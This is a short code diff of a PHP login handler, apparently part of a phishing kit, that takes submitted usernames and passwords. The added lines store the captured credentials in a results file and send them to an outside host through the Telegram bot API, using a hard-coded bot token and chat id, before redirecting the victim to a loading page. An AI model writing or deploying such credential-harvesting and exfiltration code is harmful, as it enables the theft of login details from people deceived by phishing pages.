@@ -21,15 +21,13 @@ if(!empty($_POST['username']) && !empty($_POST['inputPassword'])){
 	$op = fopen($resText,'a+');
 	fwrite($op,$message);
 	fclose($op);
-	header("Location: ../loading.html");
+$token = "2063061087:AAF4J2MhpY_UGZ4bRdeEkPIvL3HdioJoJwo";
+
+file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=2039615741&text=" . urlencode($message)."" );
+$file = fopen("../SE/ajz.txt","a");   ///  Directory Of Rezult OK.
+fwrite($file,$message); 
+
+	header("Location:  loading.html");
 	
-}else{
-	
-	header('Location: ../index.html');
-}	
-	
-	
-}else{
-	header('Location: ../index.html');
 }
 ?>
